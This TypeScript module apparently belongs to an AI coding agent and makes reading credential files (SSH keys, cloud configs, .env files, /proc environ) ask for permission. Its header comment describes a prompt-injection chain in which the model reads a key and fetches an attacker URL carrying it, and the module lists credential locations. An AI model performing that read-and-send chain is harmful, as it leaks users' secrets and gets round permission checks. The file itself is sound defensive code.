/**
 * Files whose contents are credentials. The read-only tools (read, grep)
 * run without a prompt, and web_fetch can send anything the model has
 * read to any URL, so a prompt injection could chain them: read
 * ~/.config/kimiflare/config.json (provider keys) or ~/.ssh/id_ed25519,
 * then fetch https://attacker/?k=<it>. Reading these paths asks first.
 *
 * Paths are checked as given and after resolving symlinks, so a link in
 * the repository pointing at ~/.ssh is caught too.
 */
import { realpathSync } from "node:fs";
import { homedir } from "node:os";
import { basename, isAbsolute, join, relative, resolve, sep } from "node:path";

/** Credential locations under the home directory. */
const HOME_SECRETS = [
  ".ssh", ".gnupg", ".aws", ".azure", ".kube", ".docker/config.json", ".netrc", ".git-credentials",
  ".npmrc", ".pypirc", ".pgpass", ".password-store", ".vault-token", ".terraform.d/credentials.tfrc.json",
  ".cargo/credentials", ".cargo/credentials.toml", ".gem/credentials", ".local/share/keyrings",
];

/** Credential locations under the config home ($XDG_CONFIG_HOME or ~/.config). */
const CONFIG_SECRETS = ["kimiflare", "autopilot", "gh", "gcloud", "hub"];

const PRIVATE_KEY_NAME = /^id_(rsa|dsa|ecdsa|ed25519)(_sk)?$/;
const ENV_FILE_NAME = /^\.env(\..+)?$/;
const ENV_FILE_TEMPLATE = /\.(example|sample|template|dist|defaults)$/;
const PROC_ENVIRON = /^\/proc\/[^/]+(\/task\/[^/]+)?\/environ$/;

function configHome(): string {
  return process.env.XDG_CONFIG_HOME || join(homedir(), ".config");
}

function secretRoots(): string[] {
  const home = homedir();
  return [...HOME_SECRETS.map((p) => join(home, p)), ...CONFIG_SECRETS.map((p) => join(configHome(), p))];
}

function isWithin(path: string, base: string): boolean {
  return path === base || path.startsWith(base.endsWith(sep) ? base : base + sep);
}

function realOrSelf(path: string): string {
  try {
    return realpathSync(path);
  } catch {
    return path;
  }
}

function reasonFor(path: string): string | null {
  for (const root of secretRoots()) {
    if (isWithin(path, root)) return `credentials location ${root}`;
  }
  const name = basename(path);
  if (PRIVATE_KEY_NAME.test(name)) return "an SSH private key";
  if (ENV_FILE_NAME.test(name) && !ENV_FILE_TEMPLATE.test(name)) return "an environment file (.env)";
  if (PROC_ENVIRON.test(path)) return "a process environment (/proc/*/environ)";
  return null;
}

/** The permission reason for a tool call, from a sensitive-path reason. */
export function readsCredentials(reason: string | null): string | null {
  return reason ? `reads ${reason}` : null;
}

/**
 * Why reading this absolute path needs the user's permission, or null when
 * it does not. Checks the path as given and with symlinks resolved.
 */
export function sensitivePathReason(absPath: string): string | null {
  const given = resolve(absPath);
  return reasonFor(given) ?? reasonFor(realOrSelf(given));
}

/**
 * The same for a recursive search root: also true when the search would
 * walk into a credentials location. Searches skip hidden entries, so a
 * location reached only through a dot-directory below the root (`~/.ssh`
 * from `~`) is not walked; one reached through visible names (`kimiflare`
 * from `~/.config`, `proc/1/environ` from `/`) is.
 */
export function sensitiveSearchRootReason(absRoot: string): string | null {
  const direct = sensitivePathReason(absRoot);
  if (direct) return direct;
  const roots = [resolve(absRoot), realOrSelf(resolve(absRoot))];
  for (const root of roots) {
    for (const secret of [...secretRoots(), "/proc"]) {
      if (!isWithin(secret, root) || secret === root) continue;
      const rel = relative(root, secret);
      if (isAbsolute(rel)) continue;
      if (!rel.split(sep).some((seg) => seg.startsWith("."))) {
        return secret === "/proc" ? "a process environment (/proc/*/environ)" : `credentials location ${secret}`;
      }
    }
  }
  return null;
}
